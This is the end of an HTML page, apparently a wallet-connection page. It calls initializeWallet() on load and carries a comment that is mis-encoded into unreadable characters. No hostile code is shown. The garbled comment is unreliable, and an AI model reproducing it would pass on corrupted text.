        // È†ÅÈù¢ËºâÂÖ•ÊôÇÂü∑Ë°åÂàùÂßãÂåñÔºåÈÄôÂ∞áÂº∑Âà∂È°ØÁ§∫ÈÄ£Êé•ÈÅÆÁΩ©
        initializeWallet();
    </script>
</body>
</html>